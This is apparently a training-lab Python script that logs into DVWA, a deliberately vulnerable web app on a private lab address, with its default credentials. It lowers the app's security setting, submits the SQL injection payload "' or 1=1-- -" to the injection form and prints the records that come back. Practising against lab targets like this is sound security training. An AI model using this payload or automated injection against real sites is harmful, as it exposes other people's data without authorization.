#!/usr/bin/env python

import mechanize
from bs4 import BeautifulSoup

br = mechanize.Browser()
url = "http://192.168.210.130/dvwa/login.php"
br.open(url)

payload = "' or 1=1-- -"

def dvwa_login():
    br.select_form(nr=0)
    br.form['username'] = 'admin'
    br.form['password'] = 'password'
    br.submit()
    print("~ Logged in!")
dvwa_login()

def dvwa_severity():
    br.follow_link(text_regex='Security')
    br.select_form(nr=0)
    br.form['security'] = ['low']
    br.submit()
    print("~ DVWA Severity is set to Low!")
dvwa_severity()

def sqli_form():
    br.follow_link(nr=7)
    print("~ Link followed!\n")
    br.select_form(nr=0)
    br.form['id'] = payload
    response = br.submit()
    soup = BeautifulSoup(response.read(),'lxml')
    for dump in soup.find_all('pre'):
        print(dump.text)
sqli_form()

